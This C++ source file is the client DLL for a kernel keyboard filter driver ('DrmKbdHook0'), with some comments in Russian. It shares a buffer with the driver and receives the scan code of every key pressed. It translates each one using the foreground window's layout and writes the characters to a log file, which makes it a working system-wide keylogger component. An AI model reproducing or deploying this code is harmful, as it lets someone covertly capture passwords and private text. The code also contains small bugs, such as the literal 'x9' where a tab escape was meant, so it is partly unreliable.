///////////////////////////////////////////////////////////////////////////////
//
//	Client DLL of filter driver project file
//
//	kbdhookdll.cpp - contain all client DLL code
//
//		Author:		Baranov Artem
//		Creation date:	??.??.????
//		Last modify:	??.??.????
//
//
///////////////////////////////////////////////////////////////////////////////

#define KBD_HOOK_API __declspec(dllexport)

#include <windows.h>
#include <strsafe.h>
#include <stdio.h>
#include <assert.h>
#include <key_data.h>
#include <kbdhook.h>

static PWCHAR pwszEventUName; //str with name of dll event
static PWCHAR pwszEventKName; //str with name of driver event 
static PKEY pKey; //ptr to shared buf
static PWCHAR pwszLogFileName; //str with log file name
static HANDLE hLogFile; //handle of log file
static HANDLE hKbdHookDev; //handle of driver device

static HANDLE hEventK; //event for report from driver
static HANDLE hEventU; //event for report from dll
static HANDLE hEventThreadExit; //if set thread need terminate

static HANDLE hThread; //handle of log thread
static LOG_MODE LogMode; //mode of write data in log

static enum STATUS_OF_SERVER {
	UnInitialize,
	Initialize = 1,
	LogInProgress } ServerStatus;

//function convert path from "\\BaseNamedObjects\\xxx" to standart path "xxx"
BOOL ConvertEventName( PWCHAR pwszEventDDKName, WCHAR** pwszEventSDKName );
//copy data from shared memory to buffer
DWORD DispatchReportFromServer(  );
//translate scan code to char with specified kbd layout and write ascii code to log
VOID TranslateScanCodeToCharAndWriteToLog( PKEY pKey );
//set server status
BOOL SetServerStatus( STATUS_OF_SERVER RequiredState );
//unset server status
BOOL UnSetServerStatus( STATUS_OF_SERVER StateForUnset );
//thread for waiting data from driver
DWORD __stdcall ThreadForLogInFile( PVOID );
//translate special symbolc, such LF to CRLF.
VOID WriteInLogForTextMode( const unsigned char ch );
//prg entry point
BOOL WINAPI	DllMain( HINSTANCE hDll, DWORD fdwReason, LPVOID )
{
	if( fdwReason == DLL_PROCESS_DETACH )
	{
		if( ServerStatus == LogInProgress )
		{
			StopLog(  );
		}

		if( ServerStatus == Initialize )
		{
			UnInitKbdHook(  );
		}
	}

	return TRUE;
}

BOOL __stdcall InitKbdHook( IN LPCWSTR pwszFileName, LOG_MODE LogMode )
{
	BOOL status;
	DWORD cbName;
	FOR_INIT_KBD_HOOK InitKbdHookStruct;
	ULONG cbRet;
	DWORD LastError = ERROR_SUCCESS;
	
	enum CodeFailed { 
		Success = 1,
		AllocMemForSharedBuf,
		AllocMemForLogFileName,
		CreateLogFile,
		OpenKbdHookDev,
		InternalError
	} FailedCode = Success;

	__try
	{
		status = ConvertEventName( KERNEL_EVENT_NAME, &pwszEventKName );
		assert( status );
		
		status = ConvertEventName( USER_EVENT_NAME, &pwszEventUName );
		assert( status );
		
		hEventK = CreateEvent( NULL, FALSE, FALSE, pwszEventKName );
		hEventU = CreateEvent( NULL, FALSE, TRUE, pwszEventUName );
		hEventThreadExit = CreateEvent( NULL, FALSE, FALSE, NULL );

		pKey = (PKEY)VirtualAlloc( NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

		if( !pKey )
		{
			LastError = ERROR_NOT_ENOUGH_MEMORY;
			status = 0;
			FailedCode = AllocMemForSharedBuf;
			__leave;
		}

		StringCbLength( pwszFileName, 255 * sizeof( WCHAR ), (size_t*)&cbName );

		pwszLogFileName = (PWCHAR)malloc( cbName + sizeof( WCHAR ) );
		
		if( !pwszLogFileName )
		{
			LastError = ERROR_NOT_ENOUGH_MEMORY;
			status = 0;
			FailedCode = AllocMemForLogFileName;
			__leave;
		}

		SecureZeroMemory( pwszLogFileName, cbName + sizeof( WCHAR ) );

		StringCbCopy( pwszLogFileName, cbName + sizeof( WCHAR ), pwszFileName );

		hLogFile = CreateFile( pwszLogFileName, GENERIC_ALL, FILE_SHARE_READ,
			NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );

		if( hLogFile == INVALID_HANDLE_VALUE )
		{
			LastError = ERROR_TOO_MANY_OPEN_FILES;
			status = 0;
			FailedCode = CreateLogFile;
			__leave;
		}

		hKbdHookDev = CreateFile( L"\\\\.\\DrmKbdHook0", GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, 0, NULL );

		if( hKbdHookDev == INVALID_HANDLE_VALUE )
		{
			LastError = ERROR_TOO_MANY_OPEN_FILES;
			status = 0;
			FailedCode = OpenKbdHookDev;
			__leave;
		}

		InitKbdHookStruct.Size = 4096;
		InitKbdHookStruct.StartVA = (PVOID)pKey;

		BOOL b = DeviceIoControl( hKbdHookDev, IOCTL_KBD_HOOK_INIT, &InitKbdHookStruct,
			sizeof( FOR_INIT_KBD_HOOK ), NULL, 0, &cbRet, NULL ) ;
		
		if( !b )
		{
			LastError = ERROR_INTERNAL_ERROR;
			status = 0;
			FailedCode = InternalError;
			__leave;
		}

		hThread = CreateThread( NULL, //security attrib 
			0, // default stack size
			ThreadForLogInFile,
			NULL,
			NULL, // no flags
			NULL // thread id not return 
		);

		::LogMode = LogMode;

		SetServerStatus( Initialize );
	}
	__finally
	{
		switch( FailedCode )
		{
			case InternalError:
			case OpenKbdHookDev:
				CloseHandle( hLogFile );
			case CreateLogFile:
				free( pwszLogFileName );
			case AllocMemForLogFileName:
				VirtualFree( pKey, 4096, MEM_RELEASE );
			case AllocMemForSharedBuf:
				free( pwszEventUName );
				free( pwszEventKName );
				CloseHandle( hEventK );
				CloseHandle( hEventU );
			break;
			default:
			break;
		}
	}

	SetLastError( LastError );
	return status;
}

BOOL ConvertEventName( PWCHAR pwszEventDDKName, WCHAR** pwszEventSDKName )
{
	DWORD cbDDKName;
	
	StringCbLength( pwszEventDDKName, sizeof( WCHAR ) * ( 100 + 1 ),
		 (size_t*)&cbDDKName );

	*pwszEventSDKName = (PWCHAR)malloc( cbDDKName + sizeof( WCHAR ) - 11 * sizeof( WCHAR ) );

	if( !(*pwszEventSDKName) )
	{
		SetLastError( ERROR_NOT_ENOUGH_MEMORY );
		return 0;
	}

	SecureZeroMemory(  *pwszEventSDKName, cbDDKName + sizeof( WCHAR ) - 11 * sizeof( WCHAR ) );

	StringCbCopy( *pwszEventSDKName, 
		cbDDKName + sizeof( WCHAR ) - 11 * sizeof( WCHAR ), L"Global\\" );

	StringCbCopy( *pwszEventSDKName + 7, 
		cbDDKName + sizeof( WCHAR ) - 18 * sizeof( WCHAR ), pwszEventDDKName + 18 );

	return 1;
}

DWORD __stdcall ThreadForLogInFile( PVOID )
{
	HANDLE handles_buf[] = { hEventK, hEventThreadExit };
	DWORD WaitStatus;
	DWORD IsTerminate = 0;

	while( 1 )
	{
		WaitStatus = WaitForMultipleObjects( 2, handles_buf, FALSE, INFINITE );

		switch( WaitStatus )
		{
			case WAIT_OBJECT_0: // some data in buffer
			{ // sequence: 1. read data 2. set user event 3. translate scan-code to char 4. set register char
				// 5. check file size 6. write in file
				DispatchReportFromServer();
				break;
			}
			case WAIT_OBJECT_0 + 1: // need terminate
			{
				IsTerminate = 1;
				break;
			}
		}

		if( IsTerminate ) break;
	}

	return 1;
}

DWORD DispatchReportFromServer()
{
	KEY KeyData;

	memmove( &KeyData, pKey, sizeof( KEY ) );

	SetEvent( hEventU );

	/*if( KeyData.CapsLockOn == 0xFFFF && KeyData.ScanCode == 0xFFFF &&
		KeyData.ShiftPressed == 0xFFFF )
		return 0;*/

	TranslateScanCodeToCharAndWriteToLog( &KeyData );

	return 1;
}

VOID TranslateScanCodeToCharAndWriteToLog( PKEY pKey )
{
	DWORD pid;
	DWORD num_write;
	DWORD tid = 
		GetWindowThreadProcessId( GetForegroundWindow(), &pid );

	HKL layout = GetKeyboardLayout( tid );
	UCHAR State[256];
	WORD Ch;
	CHAR ascii_char;
	int translate_status;

	GetKeyboardState( (PBYTE)&State );

	if( pKey->ShiftPressed )
		State[VK_SHIFT] = 129;
	else
		State[VK_SHIFT] = 0;

	if( pKey->CapsLockOn )
		State[VK_CAPITAL] = 129;
	else
		State[VK_CAPITAL] = 0;
	
	UINT vk = MapVirtualKeyEx( pKey->ScanCode, 1, layout );


	//трансляция может не быть истинной из-за служебного символа


	translate_status = 
		ToAsciiEx( vk, pKey->ScanCode, State, &Ch, 0, layout );

	if( translate_status > 0 )
	{
		ascii_char = (char)Ch;
		if( LogMode == Text )
			WriteInLogForTextMode( ascii_char );
		else
			WriteFile( hLogFile, &ascii_char, 1, &num_write, NULL );
	}
	//проверить возвращаемый статус
	
}

BOOL __stdcall StartLog(  )
{
	ULONG cbRet;

	if( ServerStatus != Initialize )
	{
		SetLastError( ERROR_INVALID_FUNCTION );
		return FALSE;
	}

	if( !DeviceIoControl( hKbdHookDev, IOCTL_KBD_HOOK_START, NULL, 0, 
		NULL, 0, &cbRet, NULL ) )
	{
		SetLastError( ERROR_INTERNAL_ERROR );
		return FALSE;
	}

	SetServerStatus( LogInProgress );
	SetLastError( ERROR_SUCCESS );

	return TRUE;
}

BOOL __stdcall StopLog(  )
{
	ULONG cbRet;

	if( ServerStatus != LogInProgress )
	{
		SetLastError( ERROR_INVALID_FUNCTION );
		return FALSE;
	}
	
	if( !DeviceIoControl( hKbdHookDev, IOCTL_KBD_HOOK_STOP, NULL, 0, 
		NULL, 0, &cbRet, NULL ) )
	{
		SetLastError( ERROR_INTERNAL_ERROR );
		return FALSE;
	}

	UnSetServerStatus( LogInProgress );
	SetLastError( ERROR_SUCCESS );

	return TRUE;
}

BOOL __stdcall UnInitKbdHook(  )
{
	ULONG cbRet;

	if( ServerStatus != Initialize )
	{
		SetLastError( ERROR_INVALID_FUNCTION );
		return FALSE;
	}

	if( !DeviceIoControl( hKbdHookDev, IOCTL_KBD_HOOK_UNINIT, NULL, 0,
		NULL, 0, &cbRet, NULL ) )
	{
		SetLastError( ERROR_INTERNAL_ERROR );
		return FALSE;
	}

	SetEvent( hEventThreadExit );
	WaitForSingleObject( hThread, INFINITE );

	UnSetServerStatus( Initialize );
	SetLastError( ERROR_SUCCESS );

	free( pwszEventUName );
	free( pwszEventKName );
	free( pwszLogFileName );
	VirtualFree( pKey, 4096, MEM_RELEASE );
	CloseHandle( hLogFile );
	CloseHandle( hEventK );
	CloseHandle( hEventU );
	CloseHandle( hKbdHookDev );

	return TRUE;
}

BOOL SetServerStatus( STATUS_OF_SERVER RequiredState )
{
	STATUS_OF_SERVER PrevState = (STATUS_OF_SERVER)((DWORD)RequiredState - 1);

	if( RequiredState == UnInitialize ) return FALSE;

	if( ServerStatus == PrevState )
		InterlockedIncrement( (LONG*)&ServerStatus );
	else
		return FALSE;

	return TRUE;
}

BOOL UnSetServerStatus( STATUS_OF_SERVER StateForUnset )
{
	if( StateForUnset == UnInitialize ) return FALSE;

	if( ServerStatus == StateForUnset )
		InterlockedDecrement( (LONG*)&ServerStatus );
	else
		return FALSE;

	return TRUE;
}

VOID WriteInLogForTextMode( const unsigned char ch )
{
	char enter[2] = { '\xD','\xA' };
	ULONG num_write;

	if( ch == '\xD' )
		WriteFile( hLogFile, &enter, 2, &num_write, NULL );
	else if( ch == 'x9' )
		WriteFile( hLogFile, &ch, 1, &num_write, NULL );
	else if( ch >= '\x20' && ch < '\x7F'  )
		WriteFile( hLogFile, &ch, 1, &num_write, NULL );
	else if( ch > '\x7F' )
		WriteFile( hLogFile, &ch, 1, &num_write, NULL );
	
	return;
}